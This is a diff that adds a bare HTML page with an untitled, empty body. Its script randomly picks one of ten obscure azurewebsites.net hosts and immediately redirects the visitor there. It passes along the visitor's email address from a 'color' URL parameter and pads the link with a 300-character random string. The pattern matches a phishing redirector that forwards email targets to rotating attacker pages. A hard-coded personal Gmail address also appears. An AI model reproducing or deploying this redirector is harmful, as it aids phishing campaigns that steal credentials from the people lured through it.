@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title></title>
+</head>
+<body>
+
+	<script type="text/javascript">
+
+		var rand_array = ['https://w502twralvlpkzcmljqpcoix107tcgyo.azurewebsites.net',
+				'https://3zy43nzgn94v0bekrrknqd2z2tleijot.azurewebsites.net',
+				'https://fcu1iizbjot01wgwgqt9fcwfy5ownmuu.azurewebsites.net',
+				'https://hh1qf7gwzcezrx8dgeruadkojoug68mz.azurewebsites.net',
+				'https://jolfk6opr8xaduofjzgjlv2iexvbbl5k.azurewebsites.net',
+				'https://kofhphwiqb0crsj7zgdgvmcgcla011va.azurewebsites.net',
+				'https://pn3lxkuzudiq2rnoitsc31fowezibir1.azurewebsites.net',
+				'https://rjxecgji3rc44v3oh3lqkflmsl7pz7or.azurewebsites.net',
+				'https://tja6iwsydth6cfhytxw5ug8h1vc46o79.azurewebsites.net',
+				'https://oobulbel5fmg7h8f6v89mwz7hxi9dqwl.azurewebsites.net'];
+
+		var array_length = rand_array.length;
+		console.log(array_length)
+
+
+		var array_index = getRndInteger(0,array_length)
+		var url = rand_array[array_index]
+
+		 
+		//window.location.href = url;
+
+		 var email = getAllUrlParams().color;
+		
+		 url = url+"?realm="+generateRandomString(300)+"&color="+email;
+
+		 window.location.href = url;
+
+
+
+
+
+
+		function getAllUrlParams(url) {
+
+		  // get query string from url (optional) or window
+		  var queryString = url ? url.split('?')[1] : window.location.search.slice(1);
+
+		  // we'll store the parameters here
+		  var obj = {};
+
+		  // if query string exists
+		  if (queryString) {
+
+		    // stuff after # is not part of query string, so get rid of it
+		    queryString = queryString.split('#')[0];
+
+		    // split our query string into its component parts
+		    var arr = queryString.split('&');
+
+		    for (var i = 0; i < arr.length; i++) {
+		      // separate the keys and the values
+		      var a = arr[i].split('=');
+
+		      // set parameter name and value (use 'true' if empty)
+		      var paramName = a[0];
+		      var paramValue = typeof (a[1]) === 'undefined' ? true : a[1];
+
+		      // (optional) keep case consistent
+		      paramName = paramName.toLowerCase();
+		      if (typeof paramValue === 'string') paramValue = paramValue.toLowerCase();
+
+		      // if the paramName ends with square brackets, e.g. colors[] or colors[2]
+		      if (paramName.match(/\[(\d+)?\]$/)) {
+
+		        // create key if it doesn't exist
+		        var key = paramName.replace(/\[(\d+)?\]/, '');
+		        if (!obj[key]) obj[key] = [];
+
+		        // if it's an indexed array e.g. colors[2]
+		        if (paramName.match(/\[\d+\]$/)) {
+		          // get the index value and add the entry at the appropriate position
+		          var index = /\[(\d+)\]/.exec(paramName)[1];
+		          obj[key][index] = paramValue;
+		        } else {
+		          // otherwise add the value to the end of the array
+		          obj[key].push(paramValue);
+		        }
+		      } else {
+		        // we're dealing with a string
+		        if (!obj[paramName]) {
+		          // if it doesn't exist, create property
+		          obj[paramName] = paramValue;
+		        } else if (obj[paramName] && typeof obj[paramName] === 'string'){
+		          // if property does exist and it's a string, convert it to an array
+		          obj[paramName] = [obj[paramName]];
+		          obj[paramName].push(paramValue);
+		        } else {
+		          // otherwise add the property
+		          obj[paramName].push(paramValue);
+		        }
+		      }
+		    }
+		  }
+
+		  return obj;
+		}
+
+
+
+		function getRndInteger(min, max) {
+		  return Math.floor(Math.random() * (max - min)) + min;
+		}
+
+		getEmailUsername('aghedo211@gmail.com');
+		
+		function generateRandomString(length = 3) {
+		   var result           = '';
+		   var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+		   var charactersLength = characters.length;
+		   for ( var i = 0; i < length; i++ ) {
+		      result += characters.charAt(Math.floor(Math.random() * charactersLength));
+		   }
+		   return result;
+		}
+
+
+		function getEmailUsername(email){
+			var expload = email.split('@');
+			console.log(expload[0])
+		}
+
+
+		// function check(username){
+		// 	var delimeter = '';
+
+		// 	if(indexOf(username, '.')){
+
+		// 		delimeter = '.';
+		// 	}elseif(indexOf($username, '_')){
+		// 		delimeter = '_';
+		// 	}else{
+
+		// 		return false;
+		// 	}
+
+		//    return delimeter;
+		// }
+
+	</script>
+
+</body>
+</html>
